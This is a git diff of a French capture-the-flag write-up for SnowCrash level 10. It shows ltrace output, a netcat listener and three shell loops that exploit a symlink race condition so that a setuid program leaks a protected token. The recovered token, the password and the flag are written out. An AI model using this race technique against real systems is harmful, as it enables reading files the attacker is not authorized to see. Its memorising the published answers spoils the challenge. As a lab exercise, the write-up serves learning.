@@ -1,6 +1,6 @@
 # LEVEL 10
 
-- On check ce qu'il y a: `ls -la`
+- On check ce qu'il y a: `ls -l`
 ```
 total 16
 -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
@@ -24,9 +24,14 @@ Meme soucis que l'exo precedent, can't ltrace
 ./level10 file host
 	sends file to host if you have access to it
 ```
-- On essaye de lancer la commande avec le usage indique:
-- `ltrace ./level10 /var/crash/test 0.0.0.0`
+- On essaye de lancer la commande avec le usage indiqué:
+- `ltrace ./level10 /var/crash/test 0.0.0.0` \
+On voit que le programme essaye de se connecter un host au port 6969, et que ca crash \
+- On ouvre donc un autre terminal (toujours en ssh dans la VM) et on lance : \
+`nc -l 6969` \
+- On relance en parralle l'autre commande et ca donne, en simultané:
 ```
+level10@SnowCrash:~$ ltrace ./level10 /var/crash/test 0.0.0.0
 __libc_start_main(0x80486d4, 3, 0xbffff6d4, 0x8048970, 0x80489e0 <unfinished ...>
 access("/var/crash/test", 4)                              = 0
 printf("Connecting to %s:6969 .. ", "0.0.0.0")            = 30
@@ -46,24 +51,36 @@ puts("wrote file!"wrote file!
 )                                       = 12
 +++ exited (status 12) +++
 ```
+```
+level10@SnowCrash:~$ nc -l 6969
+.*( )*.
+lol
+```
+
 On voit qu'au tout debut, le programme check les acces au fichier qu'on lui donne, si c'est ok, il fait pleins de trucs, puis il imprime le contenu du fichier.
 On se dit que si entre le moment ou il check les permission et le moment ou il print le contenu, ya moyen de bidouiller quelque chose: \
 On voudrait qu'il check les permissions d'un fichier auquel on a acces, mais qu'il affiche le contenu du token surlequel nous n'avons pas les droits... \
-On va exploiter cette `race condition` avec deux boucles while:
+On va exploiter cette `race condition` avec trois boucles while:
 
 ```bash
 while ((1))
-> do
-    > touch /var/crash/tmp
-    > rm /var/crash/tmp
-    > ln -s /home/user/level10/token /var/crash/tmp
-    > rm /var/crash/tmp
-> done
+    do nc -l 6969
+done
 ```
 
 ```bash
 while ((1))
-do ./level10 /var/crash/tmp 0.0.0.0
+    do
+        touch /var/crash/tmp
+        rm /var/crash/tmp
+        ln -s /home/user/level10/token /var/crash/tmp
+        rm /var/crash/tmp
+done
+```
+
+```bash
+while ((1))
+    do ./level10 /var/crash/tmp 0.0.0.0
 done
 ```
 
@@ -77,3 +94,6 @@ Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 
 ## 🔥 Password
 `woupa2yuojeeaaed06riuj63c`
+
+## ⚡ Flag
+`feulo4b72j7edeahuete3no7c`
